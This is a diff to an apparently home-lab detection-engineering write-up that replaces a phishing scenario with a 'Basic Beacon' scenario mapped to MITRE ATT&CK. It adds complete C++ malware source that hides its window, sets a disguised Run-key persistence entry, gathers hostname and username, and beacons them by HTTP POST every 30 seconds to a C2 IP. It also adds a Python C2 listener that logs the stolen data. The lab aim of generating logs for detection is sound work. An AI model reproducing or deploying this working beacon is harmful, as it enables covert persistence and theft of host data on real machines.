@@ -514,43 +514,166 @@ These logs will help us understand how attacks look from a defensive POV, how th
 
 Each attack scenario will later be mapped to MITRE ATT&CK and used to build detection use cases and alerts.  
 
-## Attack Scenario: Phishing via Malicious Word Attachment
+## Scenario 1: The Basic Beacon (Script-Kiddie)
 
 ### Scenario Overview
-This scenario focuses on one of the most common and effective initial access techniques: phishing with a malicious attachment.  
 
-The attack starts with a phishing email that contains a malicious Microsoft Word document.  
-Once the user downloads and opens the document, a macro is executed, which triggers a chain of actions leading to malware execution and command-and-control communication.
+In this scenario, we simulate a common entry-level malware infection. The attacker delivers a standalone executable (`WindowsUpdate.exe`) that, once executed, ensures its survival across system reboots and establishes a persistent communication channel with a Command and Control (C2) server to exfiltrate basic host information.
+
+---
 
 ### Attack Flow
-1. Attacker sends a phishing email with a malicious Word attachment
-2. User downloads and opens the Word file
-3. Malicious macro runs inside the document
-4. Macro executes a PowerShell command
-5. PowerShell downloads and executes a malicious executable
-6. The malware performs discovery, persistence, and C2 communication
+
+1. **Initial Access:** The user manually executes the malicious binary.
+2. **Evasion:** The malware immediately hides its console window to run silently in the background.
+3. **Persistence:** The malware modifies the Windows Registry `Run` key to ensure it starts automatically every time the user logs in.
+4. **Discovery:** It queries the OS for the computer name, current username, and OS version.
+5. **C2 & Exfiltration:** It initiates a periodic "Beaconing" process every 30 seconds, sending the gathered data via HTTP POST requests to the attacker's server.
+
+---
 
 ### MITRE ATT&CK Mapping
 
-#### Initial Access
-- Phishing: Attachment (T1566.001)
-#### Execution
-- User Execution: Malicious File (T1204.002)
-- Command and Scripting Interpreter: PowerShell (T1059.001)
-#### Command and Control
-- Ingress Tool Transfer (T1105)
-- Application Layer Protocol: Web Protocols (T1071.001)
-- Beaconing (T1071.004)
-#### Discovery
-- System Information Discovery (T1082)
-- Account Discovery (T1087)
-#### Persistence
-- Boot or Logon Autostart Execution: Registry Run Keys (T1547.001)
+| Stage | Action | MITRE ATT&CK ID | Artifacts / Logs |
+| --- | --- | --- | --- |
+| **Initial Execution** | User runs the `.exe` manually. | **User Execution (T1204.002)** | Sysmon Event ID 1 (Process Creation) |
+| **Persistence** | Adds binary path to `HKCU\..\Run` key. | **Boot or Logon Autostart (T1547.001)** | Sysmon Event ID 13 (Registry Value Set) |
+| **Discovery** | Collects Hostname, Username, and OS info. | **System Information Discovery (T1082)** | API Monitoring / EDR Telemetry |
+| **C2 Channel** | Establishes HTTP communication (Port 8080). | **Application Layer Protocol (T1071.001)** | Sysmon Event ID 3 (Network Connection) |
+| **Exfiltration** | Sends system info within the HTTP Body. | **Exfiltration Over C2 Channel (T1041)** | Network Traffic / PCAP Analysis |
 
-----------------
+---
 
+### Environment & Malware Setup
 
+#### Malware Source Code (C++)
 
+> **Note:** This code is compiled for Scenario 1. It focuses on basic persistence and clear beaconing patterns.
+
+```cpp
+#include <iostream>
+#include <string>
+#include <windows.h>
+#include <wininet.h>
+
+#pragma comment(lib, "wininet.lib")
+
+using namespace std;
+
+// C2 Server Configuration
+string C2_IP = "192.168.200.129";
+int C2_PORT = 8080;
+
+// [T1547.001] Persistence: Writing to Registry Run Key
+void EstablishPersistence() {
+    char path[MAX_PATH];
+    // Get the full path of the current running executable
+    GetModuleFileNameA(NULL, path, MAX_PATH);
+
+    HKEY hKey;
+    // Open the Registry Key for the current user's auto-run programs
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        // Create a new value "WindowsDiagnostic" pointing to our malware path
+        RegSetValueExA(hKey, "WindowsDiagnostic", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
+        RegCloseKey(hKey);
+    }
+}
+
+// [T1082] Discovery: Gathering Host Information
+string GatherSystemInfo() {
+    char buffer[256];
+    DWORD size = sizeof(buffer);
+    string info = "";
+
+    // Retrieve the computer name
+    if (GetComputerNameA(buffer, &size)) {
+        info += "Hostname: " + string(buffer) + " | ";
+    }
+
+    // Retrieve the current active username
+    size = sizeof(buffer);
+    if (GetUserNameA(buffer, &size)) {
+        info += "User: " + string(buffer) + " | ";
+    }
+
+    return info;
+}
+
+// [T1071.001] C2 Communication: Sending Data via HTTP POST
+void SendDataToC2(string data) {
+    // Initialize the Windows Internet (WinINet) session
+    HINTERNET hSession = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (hSession) {
+        // Connect to the C2 server IP and Port
+        HINTERNET hConnect = InternetConnectA(hSession, C2_IP.c_str(), C2_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+        if (hConnect) {
+            // Prepare an HTTP POST request to the /update endpoint
+            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/update", NULL, NULL, NULL, 0, 0);
+            if (hRequest) {
+                // Send the collected system info in the request body
+                HttpSendRequestA(hRequest, NULL, 0, (LPVOID)data.c_str(), data.length());
+                InternetCloseHandle(hRequest);
+            }
+            InternetCloseHandle(hConnect);
+        }
+        InternetCloseHandle(hSession);
+    }
+}
+
+int main() {
+    // [Evasion] Stealth: Hide the console window immediately upon execution
+    HWND hWnd = GetConsoleWindow();
+    if (hWnd) ShowWindow(hWnd, SW_HIDE);
+
+    // Run persistence once
+    EstablishPersistence();
+
+    // Main Beaconing Loop
+    while (true) {
+        string systemInfo = GatherSystemInfo();
+        SendDataToC2(systemInfo);
+        
+        // Wait for 30 seconds before the next check-in (Beacon)
+        Sleep(30000); 
+    }
+    return 0;
+}
+
+```
+
+---
+
+#### C2 Server Setup (Python)
+
+> **Standard Listener:** This Python script acts as our centralized Command & Control server. It will be used consistently across Scenarios 1, 2, and 3 to log incoming exfiltrated data into a local text file.
+
+```python
+# Save this as C2.py on your Attacker Machine
+# Usage: python3 C2.py
+import os
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from datetime import datetime
+
+LOG_FILE = "C2_Exfiltrated_Data.txt"
+
+class C2Handler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length).decode('utf-8')
+        
+        # Log the received beacon data with a timestamp
+        with open(LOG_FILE, "a") as f:
+            f.write(f"[{datetime.now()}] From {self.client_address[0]}: {post_data}\n")
+        
+        self.send_response(200)
+        self.end_headers()
+
+# Start the server on Port 8080
+HTTPServer(('', 8080), C2Handler).serve_forever()
+
+```
+
+---
 
 
 
